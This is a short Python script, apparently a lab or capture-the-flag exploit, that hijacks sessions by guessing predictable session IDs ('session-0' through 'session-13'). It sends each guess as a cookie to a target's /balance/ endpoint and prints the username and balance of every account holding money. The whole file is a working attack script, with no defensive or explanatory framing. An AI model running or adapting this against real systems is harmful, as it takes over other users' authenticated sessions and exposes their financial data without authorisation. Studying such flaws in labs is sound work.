import sys
import requests
import json



def test_session(address):
    x = requests.get(address)
    for i in range(0, 14):
        session_id = "session-" + str(i)
        response = requests.get(address + "/balance/", headers={'Cookie': f'sessionid={session_id}'})
        
        # Check for redirection or unauthorized access
        if response.status_code in [302, 403]:
            print(f"Session ID {session_id} is not authenticated")
            continue
        
        # Parse the JSON response
        try:
            response_json = response.json()
            user = response_json["username"]
            amount = response_json["balance"]
            if amount > 0:
                print(user, amount)
        except json.JSONDecodeError:
            print(f"Invalid response for session ID {session_id}")

def main(argv):
	address = sys.argv[1]
	print(test_session(address))

if __name__ == "__main__": 
	if len(sys.argv) != 2:
		print('usage: python3 %s address' % sys.argv[0])
	else:
		main(sys.argv)

